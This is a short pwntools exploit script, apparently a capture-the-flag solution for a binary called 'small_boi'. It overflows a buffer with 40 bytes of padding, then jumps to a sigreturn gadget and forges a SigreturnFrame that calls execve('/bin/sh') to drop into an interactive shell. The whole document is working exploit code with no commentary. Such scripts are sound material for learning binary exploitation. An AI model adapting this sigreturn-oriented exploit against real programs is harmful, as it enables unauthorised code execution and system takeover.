from pwn import *
#context_level='DEBUG'

p = process("./small_boi")

def main():
	context.arch = "amd64"

	sigreturn = p64(0x40017c)

	frame = SigreturnFrame()
	syscall = 0x00400185

	#execve("/bin/sh\x00, 0, 0")
	frame.rip = syscall
	frame.rax = 59
	frame.rdi = 0x4001ca
	frame.rsi = 0x0
	frame.rdx = 0x0

	payload = ""
	payload += "A"*40
	payload += sigreturn
	payload += str(frame)[8:]

	p.sendline(payload)

	p.interactive()

if __name__=="__main__":
	main()
